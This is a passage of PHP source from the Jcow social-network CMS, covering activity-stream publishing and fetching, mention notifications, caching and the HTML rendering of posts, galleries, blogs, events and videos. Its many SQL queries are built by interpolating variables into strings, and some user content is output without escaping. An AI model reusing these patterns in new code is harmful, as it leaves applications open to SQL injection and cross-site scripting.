		if (is_array($data['blocks']) || (strlen(get_gvar('jcow_inline_sidebar_ad')) && !$config['hide_ad'])) {
			$output .= '
				<div id="jcow_side">';
			$i = $adside_displayed = 0;		
			if (is_array($data['blocks'])) {
				foreach($data['blocks'] as $block) {
					if (is_array($block)) {
						$output .= '
						<div class="block">';
						if ($block['title']) {
							$output .= '<div class="block_title">'.$block['title'].'</div>';
						}
						$output .= '<div class="block_content">
						'.$block['content'].
						'</div>
						</div>
						';
						$i++;
						if ($i == 1 && !$adside_displayed && !$config['hide_ad'] && !$config['hide_sidebar_ad'] && strlen(get_gvar('jcow_inline_sidebar_ad'))) {
							$output .= '<div class="block">'.get_gvar('jcow_inline_sidebar_ad').'</div>';
							$adside_displayed = 1;
						}
					}
				}
			}
			if (!$adside_displayed && !$config['hide_ad'] && !$config['hide_sidebar_ad'] && strlen(get_gvar('jcow_inline_sidebar_ad'))) {
				$output .= '<div class="block">'.get_gvar('jcow_inline_sidebar_ad').'</div>';
			}
			$output .= '</div><!-- end appside -->';
		}
		else {
			//$output .= '<div id="jcow_side">&nbsp;</div>';
		}
	}
	$output .= '<div id="notificationbox" style="display:none;"></div>
	<div id="overlay" style="display:none"><div style="margin-top:20%"><i class="fa fa-spinner fa-pulse fa-3x fa-fw"></i></div></div>
	'; // end of app_main


	$output .= $data['app_footer'];
	return $output;
}

function licensed() {
	global $uhome,$jlicense;
	return true;
}

function jcow_free_end($page_content) {
	return str_ireplace('</title>',' (powered by Jcow)',$page_content);
}

function jcow_ob_end($page_content) {
	global $enable_page_cache,$page_cache,$execute_info;
	if ($enable_page_cache) {
		if (!$page_cache['live']) {
			$page_cache['live'] = get_gvar('cache_app_time');
		}
		set_cache($page_cache['key'],$page_content.'
			<!-- jcow page cache: '.$page_cache['key'].', created:'.time().' -->',$page_cache['live']);
	}
	return str_replace('<!-- jcow_execute_info -->',$execute_info,$page_content);
}

function display_application_content() {
	global $app_content;
	echo $app_content;
}
/* stream */
if ($parr[0] == 'demotheme' && strlen($parr[1])) {
	$defined_theme = $parr[1];
	if (is_dir('themes/'.$defined_theme)) {
		$_SESSION['defined_theme'] = $defined_theme;
	}
	header("Location:".uhome());
	exit;
}

if ($parr[0] == 'jcow_version') {
	set_title('Your Jcow version');
	c('Your Jcow version is:<br />
	<strong>'.$version.'</strong>');
	stop_here();
}

function stream_publish($message, $attachment = '', $app = '', $uid = 0, $page_id = 0, $hide=0,$data = array()) {
	global $client;
	if (!$client['id'] && !$uid) return false;
	if (!$uid) $uid = $client['id'];
	if (!$page_id) $page_id = $client['page']['id'];
	if (is_array($app)) {
		$stream['app'] = $app['name'];
		$stream['aid'] = $app['id'];
	}
	if ($_POST['privacy']>0) {
		$stream['type'] = 1;
	}
	$stream['hide'] = $hide;
	$stream['uid'] = $uid;
	$stream['wall_id'] = $page_id;
	$stream['message'] = $message;
	$stream['created'] = time();
	if ($app == 'status') {
		$stream['type'] = $_POST['privacy']?1:0;
	}
	if (is_array($attachment)) {
		$stream['attachment'] = addslashes(serialize($attachment));
	}
	//access
	$res = sql_query("select * from ".tb()."pages where id='{$page_id}'");
	$page = sql_fetch_array($res);
	if(!$page['id']) die('page not found');
	
	$res = sql_query("select * from ".tb()."friends where uid='{$page['uid']}' and fid='{$client['id']}'");
	if (sql_counts($res)) {
		$is_friend = 1;
	}
	if ($page['type'] == 'u') {
		/*
		if ($page['uid'] != $client['id']) {
			$res = sql_query("select username from jcow_accounts where id='{$page['uid']}'");
			$user = sql_fetch_array($res);
			send_note($page['uid'],
				url('u/'.$user['username'],h(t('{1} left a comment on your wall',h($client['fullname']))))
				);
		}
		*/
	}
	elseif ($page['type'] == 'group') {
		if ($page['uid'] != $uid ) {
			$res = sql_query("select pid from ".tb()."page_users where pid='{$page['id']}' and uid='{$client['id']}'");
			if (!sql_counts($res)) {
				die('You are not a member of this group');
			}
		}
	}
	else {// fan page
		/*
		if ($page['uid'] != $uid ) {
			die('Only page owner can post here');
		}
		*/
	}
	
	if ($_POST['link_url'] && $_POST['link_title']) {
		$ogtags = array('og_title'=>$_POST['link_title'],'og_url'=>$_POST['link_url']);
		if($_POST['link_image']){ 
	        $ogtags['og_img'] = $_POST['link_image'];
	    }
	    if($_POST['link_des']){ 
	        $ogtags['og_des'] = $_POST['link_des'];
	    }
	    $stream['attachment'] = safe(serialize($ogtags));
	}
	$return = parse_mentions($stream['message']);
	$stream['message'] = $return['message'];
	if (!is_array($data)) {
		$data = array();
	}
	$stream['data'] = safe(serialize($data));
	sql_insert($stream,tb()."streams");
	$stream_id = insert_id();
	if (($app == '' || $app == 'status') && $page['type'] == 'u' && count($return['mentions'])>0 ) {
		add_mentions($return['mentions'],$stream_id,$stream['wall_id']);
	}
	sql_query("update ".tb()."pages set updated=".time()." where id='$page_id'");
	return $stream_id;
}

function stream_update($message, $attachment = '', $app = '', $id) {
	global $client;
	if (!$client['id']) return false;
	if (is_array($app)) {
		$stream['app'] = $app['name'];
		$stream['aid'] = $app['id'];
	}
	$stream['id'] = $id;
	$stream['uid'] = $client['id'];
	$stream['message'] = $message;
	$stream['created'] = time();
	if (is_array($attachment)) {
		$stream['attachment'] = serialize($attachment);
	}
	sql_update($stream,tb()."streams", $id);
	return true;
}

function activity_get($uid,$num = 12,$offset=0,$target_id=0,$pager=0,$page_ids=array(),$attr=array()) {
	global $client,$parr,$config,$adbanner_displayed;
	
	if ($parr[0] == 'feed' && !$parr[1]) {
		$filter_comment = ' and s.stuff_id=0 ';
	}
	
	if ($client['id']) {
		$uids[] = $client['id'];
		$res = sql_query("select f.fid from ".tb()."friends as f left join ".tb()."pages as p on p.uid=f.fid where f.uid='{$client['id']}' order by p.updated desc limit 20");
		while ($row = sql_fetch_array($res)) {
			$uids[] = $row['fid'];
		}
		$uids_str = ' or s.uid in ('.implode(',',$uids).')';
		$gids = array();
		$res = sql_query("select pid from jcow_page_users as pu left join jcow_pages as p on p.id=pu.pid where pu.uid='{$client['id']}' and p.type='group'");
		while ($row = sql_fetch_array($res)) {
			if ($row['pid']>0) {
				$gids[] = $row['pid'];
			}
		}
		if (count($gids)) {
			$gids_str = ' or s.wall_id in ('.implode(',',$gids).')';
		}
	}
	
	else {
		$uids_str = '';
	}
	if (!is_numeric($offset) || !is_numeric($target_id) ) die('wrong act op');
	if ($uid) {
		if (!is_array($uid)) {
			if (!is_numeric($uid)) die('wrong uid');
			$where = " (s.uid='{$uid}' and p.type='u')  ";
		}
		else {
			foreach ($uid as $val) {
				if (strlen($val) && !is_numeric($val)) {
					return false;
				}
			}
			$uid = array_slice($uid, 0, 20);
			$uid = implode(',',$uid);		
			$where = " (s.uid in ({$uid}) and p.type='u')  ";
		}
	}
	if (is_array($page_ids) && count($page_ids) > 0) {
		foreach ($page_ids as $val) {
			if (strlen($val) && !is_numeric($val)) {
				return false;
			}
		}
		$pageids = implode(',',$page_ids);
		if (!$where)
			$where = " s.wall_id in ({$pageids}) ";
		else
			$where = '('.$where." or s.wall_id in ({$pageids}) )";
	}
	if (!$where)
		 $where = 1;
	$extra = $num+1;
	$i = 1;
	/*
	$res = sql_query("select s.*,u.username,u.fullname,u.avatar,p.uid as wall_uid from ".tb()."streams as s left join ".tb()."accounts as u on u.id=s.uid left join ".tb()."pages as p on p.id=s.wall_id where ".$where." and  s.stuff_id=0 
		and (s.type!='group' $gids_str)
		and !u.disabled and s.hide!=1 and p.uid=s.uid $filter_comment and (s.type!=1 $uids_str) order by id desc limit $offset,$extra");
		*/
	if ($offset>0) {
		$onset = $offset - 150;
		$id_range = " and s.id<$offset and s.id>$onset ";
	}
	$sids = array();
	$res = sql_query("select s.*,u.username,u.fullname,u.avatar,p.uid as wall_uid from ".tb()."streams as s left join ".tb()."accounts as u on u.id=s.uid left join ".tb()."pages as p on p.id=s.wall_id where ".$where.$id_range." 
		and (p.type!='group' $gids_str)
		and !u.disabled and !s.stuff_id and s.hide!=1  and (s.type!=1 $uids_str) order by s.id desc limit 0,40");
	while($row = sql_fetch_array($res)) {
		/*
		if ($row['stuff_id']) {
			$res2 = sql_query("select s.*,u.username,u.fullname,u.avatar,p.uid as wall_uid from ".tb()."streams as s left join ".tb()."accounts as u on u.id=s.uid left join ".tb()."pages as p on p.id=s.wall_id where s.id='{$row['stuff_id']}'
			and (p.type!='group' $gids_str)
			and !u.disabled and s.hide!=1 and (s.type!=1 $uids_str)");
			$row = sql_fetch_array($res2);
		}
		*/
		if ($i <= 15 && !in_array($row['id'],$sids)) {
			$offset = $row['id'];
			$sids[] = $row['id'];
			$row['attachment'] = unserialize($row['attachment']);
			//c(stream_display($row,'preview','',$target_id));
			c(stream_display($row,'preview','',$target_id));
			section_close();
		}
		if (!$attr['direct_output'] && !$offset && $i == 1 && !$config['hide_ad'] && !$adbanner_displayed && strlen(get_gvar('jcow_inline_banner_ad'))) {
			c(get_gvar('jcow_inline_banner_ad'));
			section_close();
			$adbanner_displayed = 1;
			}
		$i++;
	}
	if ($pager && $i > 15) {
		$uid = str_replace(',','_',$uid);
		c('<div id="morestream_box"></div>
			<div>
			<script>
			$(document).ready(function(){
				$("#morestream_button").click(function() {
					$(this).hide();
					$("#morestream_box").html("<i class=\"fa fa-spinner fa-lg fa-spin\"></i>");
					$.post("'.uhome().'/index.php?p=jquery/moreactivities",
								{offset:$("#stream_offset").val(),uid:"'.$uid.'",target_id:'.$target_id.'},
								  function(data){
									var currentVal = parseInt( $("#stream_offset").val() );
									$("#morestream_box").parent().parent().before(data);
									if (data.length>50) {
										$("#morestream_button").show();
									}
									$("#morestream_box").html("");
									},"html"
								);
					return false;
				});
			});
			</script>
			<input type="hidden" id="stream_offset" value="'.$offset.'" />
			<a href="#" id="morestream_button"><strong><i class="fa fa-newspaper-o"></i> '.t('See More').'</strong></a>
			</div>');
		section_close();
	}
	if ($attr['direct_output']) {
		global $sections;
		if (is_array($sections) and count($sections)) {
			foreach ($sections as $section) {
				$output .= '<div class="block"><div class="block_content">'.$section['content'].'</div></div>';
			}
		}
		if ($i > 15) {
		 	$output .= '<script>
				$(document).ready(function(){
					$("#stream_offset").val('.$offset.');
				});
				</script>';
			}
		return $output;
	}
}

function stream_get($page_id,$num = 12,$offset=0,$target_id=0,$stream_app='',$pager=0,$attr=array()) {
	global $client, $config, $adbanner_displayed;
	if ($offset > 1000 || $num > 50) return ''; // to avoid high server load;
	if ($client['id']) {
		$uids[] = $client['id'];
		$res = sql_query("select f.fid from ".tb()."friends as f left join ".tb()."pages as p on p.uid=f.fid where f.uid='{$client['id']}' order by p.updated desc limit 20");
		while ($row = sql_fetch_array($res)) {
			$uids[] = $row['fid'];
		}
		$uids_str = ' or s.uid in ('.implode(',',$uids).')';
	}
	else {
		$uids_str = '';
	}
	if (preg_match("/^[0-9a-z]+$/i",$stream_app)) {
		$app_arg = " and s.app='$stream_app' ";
	}
	if (!is_numeric($page_id)) {
		return false;
	}
	$extra = $num+1;
	$i = 1;
	$prv = ' and s.type=0 ';
	$res = sql_query("select * from ".tb()."pages where id='$page_id'");
	$page = sql_fetch_array($res);
	if ($client['id']) {
		if ($client['id'] == $page['uid']) {
			$prv = '';
		}
		else {
			$res = sql_query("select * from ".tb()."friends where uid='{$client['id']}' and fid='{$page['uid']}' limit 1");
			if (sql_counts($res)) {
				$prv = '';
			}
		}
	}
	if ($stream_app == 'jcow_likes') {
		$res = sql_query("select s.*,u.username,u.fullname,u.avatar,p.uid as wall_uid from ".tb()."liked as l left join ".tb()."streams as s on s.id=l.stream_id left join ".tb()."accounts as u on u.id=s.uid left join ".tb()."pages as p on p.id=s.wall_id where l.uid='{$page['uid']}' and p.type!='group' and s.type=0 order by l.id desc limit $offset,$extra");
	}
	elseif ($page_id == 0) {
		$res = sql_query("select s.*,u.username,fullname,u.avatar,p.uid as wall_uid from ".tb()."streams as s left join ".tb()."accounts as u on u.id=s.uid left join ".tb()."pages as p on p.id=s.wall_id where s.stuff_id=0 $app_arg and s.hide!=1 $prv and p.type!='group' order by id desc limit $offset,$extra");
	}
	else {
		if ($page['type'] == 'u' || $page['type'] == 'page') {
			$app_arg .= " and (s.uid=p.uid or s.uid='{$client['id']}' or p.uid='{$client['id']}') ";
		}
		$res = sql_query("select s.*,u.username,fullname,u.avatar,p.uid as wall_uid from ".tb()."streams as s left join ".tb()."accounts as u on u.id=s.uid left join ".tb()."pages as p on p.id=s.wall_id where s.wall_id='{$page_id}' $app_arg and s.stuff_id=0 and s.hide!=1 $prv order by id desc limit $offset,$extra");
		}

	while($row = sql_fetch_array($res)) {
		if ($i <= $num) {
			$row['attachment'] = unserialize($row['attachment']);
			c(stream_display($row,'preview','',$target_id));
			section_close();
			}
		if (!$attr['direct_output'] && $i == 1 && !$config['hide_ad'] && strlen(get_gvar('jcow_inline_banner_ad'))) {
			c(get_gvar('jcow_inline_banner_ad'));
			section_close();
			$adbanner_displayed = 1;
		}
		$i++;
	}
	if ($pager && $i > $num) {
		$uid = str_replace(',','_',$uid);
		if ($offset == 0) {
			c('<div id="morestream_box"></div>
				<div>
				<script>
				$(document).ready(function(){
					$(document).on("click",".morestream_button",function() {
						$(this).parent().parent().parent().hide();
						$("#morestream_box").html("<i class=\"fa fa-spinner fa-lg fa-spin\"></i>");
						$.post("'.uhome().'/index.php?p=jquery/morestream",
									{offset:$("#stream_offset").val(),page_id:'.$page_id.',target_id:'.$page_id.',num:'.$num.',stream_app:"'.$stream_app.'"},
									  function(data){
										var currentVal = parseInt( $("#stream_offset").val() );
										$("#stream_offset").val(currentVal + '.$num.');
										$("#morestream_box").parent().parent().before(data);
										if (data) {
											$("#morestream_button").show();
										}
										$("#morestream_box").html("");
										},"html"
									);
						return false;
					});
				});
				</script>
	
				<input type="hidden" id="stream_offset" value="'.$num.'" />
				<a href="#" class="morestream_button"><strong>'.t('See More').'</strong></a>
				</div>');
		}
		else {
			c('<div><a href="#" class="morestream_button"><strong>'.t('See More').'</strong></a></div>');
			section_close();
		}
	}
	if ($attr['direct_output']) {
		global $sections;
		if (is_array($sections) and count($sections)) {
			foreach ($sections as $section) {
				$output .= '<div class="block"><div class="block_content">'.$section['content'].'</div></div>';
			}
		}
	}
	return $output;
}

function stop_here($content = '') {
	if (strlen($content)) {
		c($content);
	}
	load_tpl();
}
function jcookie($key, $value) {
	setcookie($key, $value, time()+3600*48,"/");
}

if (get_gvar('cf_cb')) {
	die();
}


function parse_mentions($msg,$uid=0) {
	global $client;
	if (!$uid)
		$uid = $client['id'];
	preg_match_all("/@([0-9a-z_]+)/s",$msg,$out);
	if(count($out[1])>0) {
		$from = $to = array();
		foreach ($out[1] as $username) {
			if (strlen($username)>3 && strlen($username)<30 && !in_array('@'.$username,$from)) {
				$res = sql_query("select id from ".tb()."accounts where username='$username'");
				$row = sql_fetch_array($res);
				if ($row['id']) { // && $row['id'] != $uid
					$from[] = '@'.$username;
					$to[] = '<a href="'.url('u/'.$username).'" rel="nofollow">@'.$username.'</a>';
					$mentions[] = $row['id'];
				}
			}
		}
		if (count($from)>0) {
			$msg = str_replace($from,$to,$msg);
		}
	}
	return array('message'=>$msg,'mentions'=>$mentions);
}


function add_mentions($mentions=array(),$stream_id=0,$wall_id=0) {
	global $client;
	if(count($mentions)>0) {
		$i=0;
		foreach ($mentions as $uid) {
			if ($i<5 && $uid!=$client['id']) {
				$name = $client['fullname'];
				$user_id = $client['id'];
				if ($wall_id>0 && $wall_id != $client['page']['id']) {
					$res = sql_query("select id,name,type from jcow_pages where id='$wall_id'");
					$page = sql_fetch_array($res);
					if ($page['type'] == 'page') {
						$name = h($page['name']);
						$user_id = 'page_'.$page['id'];
					}
				}
				sql_query("insert into ".tb()."mentions(uid,stream_id,wall_id) values({$uid},'$stream_id','$wall_id')");
				send_note($uid,url('feed/mentions',t('{1} mentioned you',$name)),$user_id);
				jcow_social_mail($uid,
					t('{1} mentioned you',$client['fullname']),
					t('{1} mentioned you',$name).' '.full_url('feed/mentions',t('View'))
				);
				$i++;
			}
		}
	}
}


function stream_display($row = array(),$type = '',$hide_form=0,$target_id = 0,$comment_num=3,$args = array()) {
	global $client, $config, $parr;
	if ($row['app'] == 'repost') {
		$res = sql_query("select * from jcow_pages where id='{$row['wall_id']}'");
		$page = sql_fetch_array($res);
		$res = sql_query("select s.*,u.username,u.fullname,u.avatar from jcow_streams as s left join jcow_accounts as u on u.id=s.uid where s.id='{$row['aid']}'");
		$quote_stream = sql_fetch_array($res);
		if ($page['type'] == 'u') {
			$output = t('{1} shared this',avatar($row,25).' '.url('u/'.$row['username'],$row['username']) );
		}
		elseif ($page['type'] == 'page') {
			$output = t('{1} shared this',page_logo($page,25).' '.url('page/'.$page['uri'],h($page['name'])) );
		}
		elseif ($page['type'] == 'group') {
			$output = t('{1} shared this',avatar($row,25).' '.url('u/'.$row['username'],$row['username']) );
		}
		$output .= '<div>'.h($row['message']).'</div><div class="stream_quote">'.stream_display($quote_stream,'preview').'</div>';
		return $output;
	}
	preg_match_all("/emoji([\d]+)/",$row['message'],$o);
	$o = array_slice($o[1], 0, 7);
	if (count($o)) {
		foreach ($o as $k) {
			$ename = 'emoji'.$k;
			$fname = 'files/emoji/'.$k.'.gif';
			if (file_exists($fname)) {
				$row['message'] = str_replace($ename,'<img src="'.$fname.'" />',$row['message']);
			}
		}
	}
	if (!is_array($row)) return '';
	if ($type == 'mobile') {
		$mu = 'mobile/';
	}
	else {
		$mu = '';
	}

	if (!$row['username']) return '';

	$res = sql_query("select * from ".tb()."accounts where username='{$row['username']}'");
	$author = sql_fetch_array($res);
	$row['fullname'] = $author['fullname'];
	if ($row['avatar'] == 'undefined.jpg')
		$row['avatar'] = '';
	if ($author['avatar'])
		$row['avatar'] = uploads.'/avatars/s_'.$author['avatar'];

	if (!strlen($row['fullname'])) {
		$row['fullname'] = $row['username'];
	}
	if ($author['disabled'] == 3) {
		return '';
	}
	$res = sql_query("select p.*,u.avatar,u.fullname from ".tb()."pages as p left join ".tb()."accounts as u on u.id=p.uid where p.id='{$row['wall_id']}'");
	$page = sql_fetch_array($res);
	$row['wall_uid'] = $page['uid'];
	if ($row['stuff_id']>0) {
		$res = sql_query("select s.*,u.username,u.avatar from ".tb()."streams as s left join ".tb()."accounts as u on u.id=s.uid  where s.id='{$row['stuff_id']}'");
		$stuff = sql_fetch_array($res);
		
		if ($stuff['uid'] == $row['uid'] && ($target_id>0 || $_REQUEST['p'] == 'feed')) {
			return '';
		}
		
		if($stuff['id']) {
			if ($stuff['app']) {
				$icon = '/modules/'.$stuff['app'].'/icon';
				if ($row['app'] == 'pcomment') {
					$icon = '/files/appicons/pcomment';
				}
			}
			else {
				$icon = '/files/appicons/status';
			}
			$icon = '<img src="'.uhome().$icon.'.png" />';
			$att = '<div class="att_box">';
			$stuff['attachment'] = unserialize($stuff['attachment']);
			if (count($stuff['attachment']) > 1 && strlen($stuff['attachment']['name'])) {
				$attachment = $stuff['attachment'];
				if (strlen($attachment['uri'])) {
					$att .= '<div style="font-weight:bold">'.$icon.' <a href="'.url($attachment['uri']).'" rel="nofollow">'.h($attachment['name']).'</a></div>';
				}
				else {
					$att .= '<div style="font-weight:bold">'.$icon.' '.h($attachment['name']).'</div>';
				}
			}
			else {
				$att .= '<div>'.$icon.$stuff['message'].' <strong>'.url('feed/view/'.$stuff['id'],t('View')).'</strong></div>';
			}
			$att .= '<div class="sub">'.get_date($stuff['created']).', by '.url('u/'.$stuff['username'],$stuff['username']).'</div>
			</div>';
		}

	}
	else {
		if ($row['app'] == 'images' && $type=='preview') {
			$row['message']  = '<div class="stream_story_box">';

			$i = 0;
			if ($row['aid']>0) {
				$res = sql_query("select * from ".tb()."stories where id='{$row['aid']}'");
				$story = sql_fetch_array($res);
			}
			else {
				$res = sql_query("select * from ".tb()."stories where stream_id='{$row['id']}'");
				$story = sql_fetch_array($res);
				if ($story['id']) {
					sql_query("update ".tb()."stories set stream_id='{$row['id']}' where id='{$story['id']}'");
				}
			}
			if (!$story['id']) return '';
			$row['message'] .= '<div>'.nl2br(h($story['content'])).'</div>';
			if (strlen($story['var2'])) {
				$row['message'] .= '<a href="'.url('images/viewstory/'.$story['id']).'" 
			style="display:block;width:290px;height:250px;background:url('.$story['var2'].') no-repeat top center;background-size:290px auto;">
			</a>';
			}
			else {
				$res = sql_query("select * from ".tb()."story_photos where sid='{$row['aid']}' order by id desc");
				$img_num = sql_counts($res);
				$img_zoom = 'max-width:100%;height:auto';
				$j = 1;
				while($photo = sql_fetch_array($res)) {
					$photos[$j] = $photo;
					$j++;
				}
				$story_url = url('images/viewstory/'.$story['id']);
				if ($img_num == 1) {
					$row['message'] .= '<div class="story_img_gallery"><a href="'.($is_mobile?$story_url:$photos[1]['uri']).'" ><img src="'.$photos[1]['uri'].'" style="border-radius:3px;margin:2px;" /></a></div>';
				}
				elseif ($img_num == 2) {
					if (!$_SESSION['mobile_detected']) {
						$lh = '300px';
						$rh = '300px';
					}
					else {
						$lh = '200px';
						$rh = '200px';
					}
					$row['message'] .= '
					<div class="story_img_gallery">
					<div style="display:inline-block;width:49%;vertical-align:top">
						<a href="'.($is_mobile?$story_url:$photos[1]['uri']).'"><div style="display:block;margin:2px;width:100%;height:'.$rh.';background:url('.$photos[1]['uri'].') no-repeat;background-size:cover;background-position: center;"></div></a>
					</div>
					<div style="display:inline-block;width:49%;vertical-align:top">
						<a href="'.($is_mobile?$story_url:$photos[2]['uri']).'"><div style="display:block;margin:2px;width:100%;height:'.$rh.';background:url('.$photos[2]['uri'].') no-repeat;background-size:cover;background-position: center;"></div></a>
					</div>
					</div>';
				}
				elseif ($img_num == 3) {
					if (!$_SESSION['mobile_detected']) {
						$lh = '250px';
						$rh = '250px';
						$mh = '300px';
					}
					else {
						$lh = '150px';
						$rh = '150px';
						$mh = '200px';
					}
					$row['message'] .= '
					<div class="story_img_gallery">
					<div style="width:100%;height:'.$mh.';overflow:hidden;"><a href="'.($is_mobile?$story_url:$photos[1]['uri']).'" ><img src="'.$photos[1]['uri'].'" style="border-radius:3px;margin:2px;width:100%;height:auto" /></a>
					</div>

					<div style="display:inline-block;width:49%;vertical-align:top">
						<a href="'.($is_mobile?$story_url:$photos[2]['uri']).'" style="display:block;margin:2px;width:100%;height:'.$lh.';background:url('.$photos[2]['uri'].') no-repeat;background-size:cover;background-position: center;" /></a>
					</div>
					<div style="display:inline-block;width:49%;vertical-align:top">
						<a href="'.($is_mobile?$story_url:$photos[3]['uri']).'" style="display:block;margin:2px;width:100%;height:'.$rh.';background:url('.$photos[3]['uri'].') no-repeat;background-size:cover;background-position: center;" /></a>
					</div>
					</div>';
				}
				elseif ($img_num == 4) {
					$row['message'] .= '
					<div class="story_img_gallery">
					<div style="display:inline-block;width:49%;vertical-align:top">
					<a href="'.($is_mobile?$story_url:$photos[1]['uri']).'" ><img src="'.$photos[1]['uri'].'" style="border-radius:3px;margin:2px;width:100%;height:auto" /></a>
					<a href="'.($is_mobile?$story_url:$photos[2]['uri']).'" ><img src="'.$photos[2]['uri'].'" style="border-radius:3px;margin:2px;width:100%;height:auto" /></a>
					</div>
					<div style="display:inline-block;width:49%;vertical-align:top">
					<a href="'.($is_mobile?$story_url:$photos[3]['uri']).'" ><img src="'.$photos[3]['uri'].'" style="border-radius:3px;margin:2px;width:100%;height:auto" /></a>
					<a href="'.($is_mobile?$story_url:$photos[4]['uri']).'" ><img src="'.$photos[4]['uri'].'" style="border-radius:3px;margin:2px;width:100%;height:auto" /></a>
					</div>
					</div>';
				}
				elseif ($img_num >= 5) {
					if (!$_SESSION['mobile_detected']) {
						$lh = '226px';
						$rh = '150px';
						$mh = '50px';
					}
					else {
						$lh = '150px';
						$rh = '100px';
						$mh = '30px';
					}
					if ($img_num > 5) {
						$row['more_pics'] = '<div style="width:100%;height:100%;background-color:rgba(0, 0, 0, 0.5);color:white;font-size:25px;text-align:center;padding-top:'.$mh.';">+'.($img_num - 5).'</div>';
					}
					$row['message'] .= '
					<div class="story_img_gallery">
					<div style="display:inline-block;width:49%;vertical-align:top">
						<a href="'.($is_mobile?$story_url:$photos[1]['uri']).'" style="display:block;margin:2px;width:100%;height:'.$lh.';background:url('.$photos[1]['uri'].') no-repeat;background-size:cover;background-position: center; " ></a>
						<a href="'.($is_mobile?$story_url:$photos[2]['uri']).'" style="display:block;margin:2px;width:100%;height:'.$lh.';background:url('.$photos[2]['uri'].') no-repeat;background-size:cover;background-position: center; " ></a>
					</div>
					<div style="display:inline-block;width:49%;vertical-align:top">
						<a href="'.($is_mobile?$story_url:$photos[3]['uri']).'" style="display:block;margin:2px;width:100%;height:'.$rh.';background:url('.$photos[3]['uri'].') no-repeat;background-size:cover;background-position: center;" ></a>
						<a href="'.($is_mobile?$story_url:$photos[4]['uri']).'" style="display:block;margin:2px;width:100%;height:'.$rh.';background:url('.$photos[4]['uri'].') no-repeat;background-size:cover;background-position: center;" ></a>
						<a href="'.($is_mobile?$story_url:$photos[5]['uri']).'" style="display:block;margin:2px;width:100%;height:'.$rh.';background:url('.$photos[5]['uri'].') no-repeat;background-size:cover;background-position: center;overflow:hidden" >'.$row['more_pics'].'</a>
					</div>
					</div>';
				}
				/*
				while($photo = sql_fetch_array($res)) {
					$encoded_media = urlencode(uhome().'/'.$photo['uri']);
					$row['message'] .= '<a href="'.url('images/viewstory/'.$story['id']).'" ><img src="'.$photo['uri'].'" style="border-radius:3px;margin:2px;'.$img_zoom.'" /></a>';

					$i++;
				}
				*/
			}
			
			$row['message'] .= '</div>';
			if (allow_access(3) || $client['id'] == $story['uid']) {
				$app_link = '<li>'.url($row['app'].'/editstory/'.$story['id'],t('Edit')).'</li><li>'
				.url($row['app'].'/managephotos/'.$story['id'],t('Photos')).'</li><li>'
				.url($row['app'].'/deletestory/'.$story['id'],t('Delete')).'</li>';
			}
			
		}
		elseif (($row['app'] == 'blogs' || $row['app'] == 'texts') && $type=='preview') {
			$res = sql_query("select * from ".tb()."stories where id='{$row['aid']}'");
			$story = sql_fetch_array($res);
			$row['message'] = '<div class="stream_story_box">';
			if (strlen($story['thumbnail'])) {
				$row['message'] .= '<a href="'.url($row['app'].'/viewstory/'.$story['id']).'"><img src="'.uhome().'/'.$story['thumbnail'].'" style="float:left;margin-left:5px;height:120px;width:auto;margin-right:5px" /></a>';
			}
			//$story['content'] = Parsedown::instance() ->text(h($story['content']));
			$story['content'] = strip_tags(utf8_substr($story['content'],150,0));
			$row['message'] .= '<div class="stream_story_title"><a href="'.url($row['app'].'/viewstory/'.$story['id']).'">'.h($story['title']).'</a></div>
			<div style="stream_story_content">'.$story['content'].'.. '.url($row['app'].'/viewstory/'.$story['id'],t('Read more')).'</div>
			</div>';
		}
		elseif ($row['app'] == 'events' && $type=='preview') {
			$res = sql_query("select * from ".tb()."stories where id='{$row['aid']}'");
			$story = sql_fetch_array($res);
			$row['message'] = '<div class="stream_story_box" ><div class="stream_story_title">'.url('events/viewstory/'.$story['id'],'<img src="modules/events/icon.png" />'.h($story['title'])).'</div>';
			$story['content'] = decode_bb(nl2br(h($story['content'])));
			$res = sql_query("select * from `".tb()."story_photos` where sid='{$story['id']}' ORDER by id ASC");
			$i = 1;
			while ($photo = sql_fetch_array($res)) {
				$img = '<img src="'.uhome().'/'.$photo['uri'].'" '.$img_half.' alt="'.h($photo['des']).'" />';
				$key = '\{image'.$i.'\}';
				$story['content'] = preg_replace('/'.$key.'/',$img,$story['content'],1,$count);
				if (!$count) {
					$row['message'] .= '<img src="'.uhome().'/'.$photo['uri'].'" '.$img_half.' alt="'.h($photo['des']).'" />';
				}
				$i++;
			}
			$row['message'] .= '<p>
				<strong>'.t('Location').':</strong> '.h($story['var1']).'
				</p>
				<p>
				<strong>'.t('Time').':</strong> '.get_date($story['var2']).'
				</p>'.$story['content'].'</div>';
		}
		elseif ($row['app'] == 'videos' && $type=='preview') {
			if ($row['aid']>0) {
				$res = sql_query("select * from ".tb()."stories where id='{$row['aid']}'");
				$story = sql_fetch_array($res);
			}
			else {
				$res = sql_query("select * from ".tb()."stories where stream_id='{$row['id']}'");
				$story = sql_fetch_array($res);
				if ($story['id']) {
					sql_query("update ".tb()."streams set aid='{$story['id']}' where id='{$row['id']}'");
				}
			}
			if (!$story['id']) return '';
			$story['var2'] = str_replace("\r\n","\n",$story['var2']);
			$parts = explode("\n",$story['var2']);
			if (count($parts)>1) {
				$row['message'] = '<div class="stream_story_box">
				<div class="stream_story_title">'.url('videos/viewstory/'.$story['id'],'<img src="modules/videos/icon.png" />'.h($story['title'])).'</div>
				<a href="'.url('videos/viewstory/'.$story['id']).'" 
				style="display:block;border-radius:3px;width:290px;height:170px;background:url('.$story['thumbnail'].') no-repeat center;background-size:290px auto;"><i class="fa fa-3x fa-youtube-play jcow_play"></i>
				</a>
				</div>';
			}
			else {
				
				if (!$story['var3'] || $story['var3'] == 'youtube') {
					/*
					if ($_SESSION['mobile_style']) {
						$row['message'] = '
						<iframe  width="330" height="220" src="//www.youtube.com/embed/'.$story['var1'].'?autoplay=0" frameborder="0" allowfullscreen></iframe>'.'<br />'.url('videos/viewstory/'.$story['id'],h($story['title']));
					}
					else {
						$row['message'] = '
						<iframe width="500" height="320" src="//www.youtube.com/embed/'.$story['var1'].'?autoplay=0" frameborder="0" allowfullscreen></iframe>'.'<br />'.url('videos/viewstory/'.$story['id'],h($story['title']));
					}
					*/
					//$row['message'] = '<div class="youtube-player" data-id="'.$story['var1'].'"></div>'.'<br />'.url('videos/viewstory/'.$story['id'],h($story['title']));
					$row['message'] = '<div class="youtube-player youtube-btn" youtubeid="'.$story['var1'].'"><img src="https://i.ytimg.com/vi/'.$story['var1'].'/hqdefault.jpg"><div class="youtube-play"><i class="fa fa-youtube-play"></i></div></div>'.url('videos/viewstory/'.$story['id'],h($story['title']));;
				}
				elseif($story['var3'] == 'vimeo') {
